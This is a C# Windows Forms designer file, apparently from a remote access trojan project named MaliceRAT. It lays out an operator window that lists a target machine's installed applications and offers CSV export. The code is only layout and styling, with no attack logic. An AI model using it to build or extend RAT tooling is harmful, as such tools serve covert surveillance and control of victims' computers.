namespace MaliceRAT.RatUI
{
    partial class Application_Enumeration
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            this.flowLayoutPanel2 = new System.Windows.Forms.FlowLayoutPanel();
            this.titleLabel = new System.Windows.Forms.Label();
            this.gunaDragControl = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.exportAsCsvButton = new Guna.UI2.WinForms.Guna2Button();
            this.gunaProgramsTable = new Guna.UI2.WinForms.Guna2DataGridView();
            this.columnName = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.columnVersion = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.columnPublisher = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.colunmInstallDate = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.flowLayoutPanel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.gunaProgramsTable)).BeginInit();
            this.SuspendLayout();
            // 
            // flowLayoutPanel2
            // 
            this.flowLayoutPanel2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.flowLayoutPanel2.Controls.Add(this.titleLabel);
            this.flowLayoutPanel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.flowLayoutPanel2.Location = new System.Drawing.Point(0, 0);
            this.flowLayoutPanel2.Margin = new System.Windows.Forms.Padding(0);
            this.flowLayoutPanel2.Name = "flowLayoutPanel2";
            this.flowLayoutPanel2.Size = new System.Drawing.Size(800, 25);
            this.flowLayoutPanel2.TabIndex = 8;
            // 
            // titleLabel
            // 
            this.titleLabel.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.titleLabel.Font = new System.Drawing.Font("Josefin Sans", 10F);
            this.titleLabel.ForeColor = System.Drawing.SystemColors.Control;
            this.titleLabel.ImageAlign = System.Drawing.ContentAlignment.TopLeft;
            this.titleLabel.Location = new System.Drawing.Point(0, 0);
            this.titleLabel.Margin = new System.Windows.Forms.Padding(0);
            this.titleLabel.Name = "titleLabel";
            this.titleLabel.Size = new System.Drawing.Size(797, 25);
            this.titleLabel.TabIndex = 6;
            this.titleLabel.Text = "Application Enumeration [username]";
            this.titleLabel.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // gunaDragControl
            // 
            this.gunaDragControl.TargetControl = this.titleLabel;
            // 
            // exportAsCsvButton
            // 
            this.exportAsCsvButton.Animated = true;
            this.exportAsCsvButton.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(18)))), ((int)(((byte)(18)))));
            this.exportAsCsvButton.DialogResult = System.Windows.Forms.DialogResult.None;
            this.exportAsCsvButton.FocusedColor = System.Drawing.Color.Empty;
            this.exportAsCsvButton.Font = new System.Drawing.Font("Josefin Sans", 9F);
            this.exportAsCsvButton.ForeColor = System.Drawing.SystemColors.Control;
            this.exportAsCsvButton.Image = null;
            this.exportAsCsvButton.ImageSize = new System.Drawing.Size(20, 20);
            this.exportAsCsvButton.Location = new System.Drawing.Point(12, 415);
            this.exportAsCsvButton.Name = "exportAsCsvButton";
            this.exportAsCsvButton.Size = new System.Drawing.Size(776, 28);
            this.exportAsCsvButton.TabIndex = 23;
            this.exportAsCsvButton.Text = "Export as CSV";
            this.exportAsCsvButton.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.exportAsCsvButton.Click += new System.EventHandler(this.exportAsCsvButton_Click);
            // 
            // gunaProgramsTable
            // 
            this.gunaProgramsTable.AllowUserToAddRows = false;
            this.gunaProgramsTable.AllowUserToDeleteRows = false;
            this.gunaProgramsTable.AllowUserToResizeRows = false;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(23)))));
            dataGridViewCellStyle1.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle1.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.gunaProgramsTable.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
            this.gunaProgramsTable.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProgramsTable.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(23)))));
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.gunaProgramsTable.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
            this.gunaProgramsTable.ColumnHeadersHeight = 30;
            this.gunaProgramsTable.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.columnName,
            this.columnVersion,
            this.columnPublisher,
            this.colunmInstallDate});
            dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            dataGridViewCellStyle4.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.gunaProgramsTable.DefaultCellStyle = dataGridViewCellStyle4;
            this.gunaProgramsTable.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(140)))), ((int)(((byte)(140)))), ((int)(((byte)(140)))));
            this.gunaProgramsTable.Location = new System.Drawing.Point(0, 25);
            this.gunaProgramsTable.Margin = new System.Windows.Forms.Padding(0);
            this.gunaProgramsTable.MultiSelect = false;
            this.gunaProgramsTable.Name = "gunaProgramsTable";
            this.gunaProgramsTable.ReadOnly = true;
            dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            dataGridViewCellStyle5.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            dataGridViewCellStyle5.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.gunaProgramsTable.RowHeadersDefaultCellStyle = dataGridViewCellStyle5;
            this.gunaProgramsTable.RowHeadersVisible = false;
            this.gunaProgramsTable.RowHeadersWidth = 40;
            dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            dataGridViewCellStyle6.ForeColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            dataGridViewCellStyle6.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.gunaProgramsTable.RowsDefaultCellStyle = dataGridViewCellStyle6;
            this.gunaProgramsTable.RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProgramsTable.RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.SystemColors.Control;
            this.gunaProgramsTable.RowTemplate.DefaultCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            this.gunaProgramsTable.RowTemplate.DefaultCellStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.gunaProgramsTable.RowTemplate.ReadOnly = true;
            this.gunaProgramsTable.RowTemplate.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            this.gunaProgramsTable.ShowCellToolTips = false;
            this.gunaProgramsTable.Size = new System.Drawing.Size(800, 375);
            this.gunaProgramsTable.TabIndex = 19;
            this.gunaProgramsTable.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.SystemColors.Control;
            this.gunaProgramsTable.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.gunaProgramsTable.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.gunaProgramsTable.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.gunaProgramsTable.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.gunaProgramsTable.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProgramsTable.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(140)))), ((int)(((byte)(140)))), ((int)(((byte)(140)))));
            this.gunaProgramsTable.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(21)))), ((int)(((byte)(21)))), ((int)(((byte)(23)))));
            this.gunaProgramsTable.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.gunaProgramsTable.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            this.gunaProgramsTable.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(18)))), ((int)(((byte)(18)))));
            this.gunaProgramsTable.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.gunaProgramsTable.ThemeStyle.HeaderStyle.Height = 30;
            this.gunaProgramsTable.ThemeStyle.ReadOnly = true;
            this.gunaProgramsTable.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.gunaProgramsTable.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.gunaProgramsTable.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Josefin Sans", 8.25F);
            this.gunaProgramsTable.ThemeStyle.RowsStyle.ForeColor = System.Drawing.SystemColors.Control;
            this.gunaProgramsTable.ThemeStyle.RowsStyle.Height = 22;
            this.gunaProgramsTable.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(27)))));
            this.gunaProgramsTable.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            // 
            // columnName
            // 
            dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            this.columnName.DefaultCellStyle = dataGridViewCellStyle3;
            this.columnName.FillWeight = 300F;
            this.columnName.HeaderText = "Name";
            this.columnName.Name = "columnName";
            this.columnName.ReadOnly = true;
            // 
            // columnVersion
            // 
            this.columnVersion.HeaderText = "Version";
            this.columnVersion.Name = "columnVersion";
            this.columnVersion.ReadOnly = true;
            // 
            // columnPublisher
            // 
            this.columnPublisher.HeaderText = "Publisher";
            this.columnPublisher.Name = "columnPublisher";
            this.columnPublisher.ReadOnly = true;
            // 
            // colunmInstallDate
            // 
            this.colunmInstallDate.HeaderText = "Install Date";
            this.colunmInstallDate.Name = "colunmInstallDate";
            this.colunmInstallDate.ReadOnly = true;
            // 
            // Application_Enumeration
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(21)))));
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.exportAsCsvButton);
            this.Controls.Add(this.gunaProgramsTable);
            this.Controls.Add(this.flowLayoutPanel2);
            this.ForeColor = System.Drawing.SystemColors.Control;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Application_Enumeration";
            this.Text = "Application Enumeration";
            this.flowLayoutPanel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.gunaProgramsTable)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.FlowLayoutPanel flowLayoutPanel2;
        private System.Windows.Forms.Label titleLabel;
        private Guna.UI2.WinForms.Guna2DragControl gunaDragControl;
        private Guna.UI2.WinForms.Guna2Button exportAsCsvButton;
        private Guna.UI2.WinForms.Guna2DataGridView gunaProgramsTable;
        private System.Windows.Forms.DataGridViewTextBoxColumn columnName;
        private System.Windows.Forms.DataGridViewTextBoxColumn columnVersion;
        private System.Windows.Forms.DataGridViewTextBoxColumn columnPublisher;
        private System.Windows.Forms.DataGridViewTextBoxColumn colunmInstallDate;
    }
}